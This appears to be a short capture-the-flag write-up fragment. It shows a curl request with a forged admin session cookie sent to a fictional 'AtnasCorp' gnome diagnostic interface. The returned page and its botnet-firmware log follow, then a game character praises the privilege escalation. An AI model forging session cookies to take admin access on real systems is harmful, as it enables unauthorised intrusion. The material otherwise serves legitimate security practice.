paul@paulweb:~/www$ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aRnEEA.a8PDShbSAlNFpOTirEfpVicYmbU' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<div style='display:flex; justify-content:center; gap:10px;'>
<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
System Log<br/>
2025-11-16 05:57:24: Movement detected.<br/>
2025-11-16 10:31:06: AtnasCorp C&C connection restored.<br/>
2025-11-16 12:24:13: Checking for updates.<br/>
2025-11-16 12:24:13: Firmware Update available: refrigeration-botnet.bin<br/>
2025-11-16 12:24:15: Firmware update downloaded.<br/>
2025-11-16 12:24:15: Gnome will reboot to apply firmware update in one hour.</div>
</div>
<div class="statuscheck">
    <div class="status-container">
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Live Camera Feed</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Network Connection</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Connectivity to Atnas C&C</span>
        </div>
    </div>
</div>

</body>


refrigeration-botnet.bin
```

## Response

!!! quote "Paul Beckett"

    Brilliant work on that privilege escalation! You've successfully gained admin access to the diagnostic interface.

    Now we finally know what updates the gnomes have been receiving - proper good pentesting skills in action!
